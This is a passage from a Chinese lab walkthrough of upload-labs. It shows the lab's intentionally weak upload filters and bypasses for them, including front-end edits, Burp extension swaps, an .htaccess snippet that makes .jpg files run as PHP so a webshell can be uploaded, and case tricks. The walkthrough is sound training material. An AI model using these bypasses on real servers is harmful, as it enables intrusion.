            "date_published": "2021-05-01T15:24:41.000Z",
            "content_html": "<h1 id=\"upload-labs通关记录总计\"><a class=\"markdownIt-Anchor\" href=\"#upload-labs通关记录总计\">#</a> upload-labs 通关记录总计</h1>\n<h2 id=\"pass-01前端绕过\"><a class=\"markdownIt-Anchor\" href=\"#pass-01前端绕过\">#</a> Pass-01 (前端绕过)</h2>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306140038674.png\" alt=\"image-20210306140038674\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">三种方法：</span><br><span class=\"line\">前端绕过，jpg改php，删除&quot;return checkFile()&quot;</span><br></pre></td></tr></table></figure>\n<p>题目源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkFile</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> file = document.getElementsByName(<span class=\"string\">&#x27;upload_file&#x27;</span>)[<span class=\"number\">0</span>].value;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file == <span class=\"literal\">null</span> || file == <span class=\"string\">&quot;&quot;</span>) &#123;</span><br><span class=\"line\">        alert(<span class=\"string\">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//定义允许上传的文件类型</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> allow_ext = <span class=\"string\">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class=\"line\">    <span class=\"comment\">//提取上传文件的类型</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> ext_name = file.substring(file.lastIndexOf(<span class=\"string\">&quot;.&quot;</span>));</span><br><span class=\"line\">    <span class=\"comment\">//判断上传文件类型是否允许上传</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (allow_ext.indexOf(ext_name + <span class=\"string\">&quot;|&quot;</span>) == -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> errMsg = <span class=\"string\">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class=\"string\">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class=\"line\">        alert(errMsg);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>第一种方法 - 前端绕过</p>\n<p>添加允许上传为 php 文件</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306140551825.png\" alt=\"image-20210306140551825\"></p>\n<p>上传 a.php，成功上传</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306140637377.png\" alt=\"image-20210306140637377\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306140716311.png\" alt=\"image-20210306140716311\"></p>\n<p>第二种方法 - burp 抓包进行改包</p>\n<p>上传 b.jpg 进行 burp 抓包，改为 b.php 成功上传</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306141026280.png\" alt=\"image-20210306141026280\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306141056357.png\" alt=\"image-20210306141056357\"></p>\n<p>第三种方法 - 删除 &quot;return checkFile ()&quot;</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这个有点玄学,谷歌有时会不行,拿火狐就可以了</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306141425783.png\" alt=\"image-20210306141425783\"></p>\n<p>成功上传 c.php</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306141515473.png\" alt=\"image-20210306141515473\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306141525686.png\" alt=\"image-20210306141525686\"></p>\n<h2 id=\"pass-02jpg改包php上传\"><a class=\"markdownIt-Anchor\" href=\"#pass-02jpg改包php上传\">#</a> Pass-02 (jpg 改包 php 上传)</h2>\n<p>题目源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>] == <span class=\"string\">&#x27;image/jpeg&#x27;</span>) || (<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>] == <span class=\"string\">&#x27;image/png&#x27;</span>) || (<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>] == <span class=\"string\">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH.<span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>jpg 改包为 php，成功上传</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306142420671.png\" alt=\"image-20210306142420671\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306142449990.png\" alt=\"image-20210306142449990\"></p>\n<h2 id=\"pass-03php后缀上传\"><a class=\"markdownIt-Anchor\" href=\"#pass-03php后缀上传\">#</a> Pass-03 (php 后缀上传)</h2>\n<p>题目源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;.asp&#x27;</span>,<span class=\"string\">&#x27;.aspx&#x27;</span>,<span class=\"string\">&#x27;.php&#x27;</span>,<span class=\"string\">&#x27;.jsp&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//收尾去空</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.date(<span class=\"string\">&quot;YmdHis&quot;</span>).rand(<span class=\"number\">1000</span>,<span class=\"number\">9999</span>).<span class=\"variable\">$file_ext</span>;            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                 <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306142652858.png\" alt=\"image-20210306142652858\"></p>\n<p>成功上传</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306142712846.png\" alt=\"image-20210306142712846\"></p>\n<h2 id=\"pass-04htaccess上传\"><a class=\"markdownIt-Anchor\" href=\"#pass-04htaccess上传\">#</a> Pass-04 (.htaccess 上传)</h2>\n<p>题目源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;php1&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;pHp1&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//收尾去空</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.date(<span class=\"string\">&quot;YmdHis&quot;</span>).rand(<span class=\"number\">1000</span>,<span class=\"number\">9999</span>).<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">先进行上传.htaccess一句话，在上传图片木马</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;FilesMatch &quot;*.jpg&quot;&gt;</span><br><span class=\"line\">SetHandler application&#x2F;x-httpd-php</span><br><span class=\"line\">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306143049283.png\" alt=\"image-20210306143049283\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306143106452.png\" alt=\"image-20210306143106452\"></p>\n<p>在进行上传图片木马</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306143124871.png\" alt=\"image-20210306143124871\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306143142936.png\" alt=\"image-20210306143142936\"></p>\n<h2 id=\"pass-05大小写绕过\"><a class=\"markdownIt-Anchor\" href=\"#pass-05大小写绕过\">#</a> Pass-05 (大小写绕过)</h2>\n<p>题目源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.htaccess&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//首尾去空</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.date(<span class=\"string\">&quot;YmdHis&quot;</span>).rand(<span class=\"number\">1000</span>,<span class=\"number\">9999</span>).<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210311193803467.png\" alt=\"image-20210311193803467\"></p>\n<p>成功上传</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210311193819330.png\" alt=\"image-20210311193819330\"></p>\n<h2 id=\"pass-06空格绕过\"><a class=\"markdownIt-Anchor\" href=\"#pass-06空格绕过\">#</a> Pass-06（空格绕过）</h2>\n<p>题目源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span 